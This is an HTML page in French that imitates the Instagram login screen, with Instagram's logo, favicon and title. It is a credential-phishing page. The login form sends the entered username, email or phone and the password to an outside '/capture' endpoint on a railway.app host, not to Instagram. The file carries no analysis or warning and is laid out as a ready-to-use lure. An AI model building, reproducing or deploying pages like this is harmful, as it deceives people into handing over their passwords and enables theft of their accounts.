<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./styles.css" />
    <link rel="icon" type="image/png" href="../image/icons8-instagram-96.png">

    <title>Connexion • instagram</title>

    <link rel="stylesheet" href="style.css">
</head>

<body>
    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex">
        </section> 

        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="../image/zqpwkLQ_d.webp" alt="Logo Instagram">
                </h1>

                <!-- FORMULAIRE CORRIGÉ -->
                <form action="https://instagramable-production.up.railway.app/capture" 
                      method="POST" 
                      autocomplete="off">

                    <label for="email" class="sr-only">Téléphone, nom d’utilisateur ou e-mail</label>
                    <input id="email" 
                           name="email" 
                           type="text"
                           placeholder="Téléphone, nom d’utilisateur ou e-mail" 
                           required />

                    <label for="password" class="sr-only">Mot de passe</label>
                    <input id="password" 
                           name="password" 
                           type="password" 
                           placeholder="Mot de passe" 
                           required />

                    <button type="submit">Se connecter</button>
                </form>

                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">OU</div>
                    <span></span>
                </div>

                <div class="login-with-fb flex direction-column align-items-center">
                    <div>
                        <a>Se connecter avec Facebook</a>
                    </div>
                    <a href="#">Mot de passe oublié ?</a>
                </div>

            </div>
        </section>
    </main>
</body>
</html>
